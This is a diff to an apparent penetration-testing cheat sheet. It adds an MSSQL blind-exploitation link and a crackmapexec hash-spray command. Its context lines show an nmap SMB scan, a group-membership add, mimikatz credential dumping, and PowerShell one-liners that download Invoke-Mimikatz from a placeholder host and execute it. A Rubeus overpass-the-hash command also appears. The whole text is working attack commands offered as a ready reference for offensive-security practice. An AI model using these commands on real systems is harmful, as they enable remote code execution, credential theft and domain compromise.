@@ -592,6 +592,7 @@ nmap -v -p 139, 445 --script=smb-os-discovery {IP ADDRESS}
 <br />
 
 [https://www.tutorialspoint.com/sql/sql-select-database.htm](https://www.tutorialspoint.com/sql/sql-select-database.htm)
+[https://guide.offsecnewbie.com/5-sql#mssql-blind-exploitation](https://guide.offsecnewbie.com/5-sql#mssql-blind-exploitation)
 
 ```bash
 
@@ -693,6 +694,9 @@ net group "{GROUP}" {USERNAME} /add
 sekurlsa::logonpasswords
 IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds 
 IEX (New-Object System.Net.Webclient).DownloadString("http://{IP ADDRESS}/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
+
+# Hash Spray for valid credentials
+crackmapexec smb {LHOST} -u {user.txt} -H {hash.txt}
 
 # Rubeus Overpass the hash
 rubeus.exe asktgt /domain:{DOMAIN}/user:{USER} /rc4:{NT HASH} /ptt
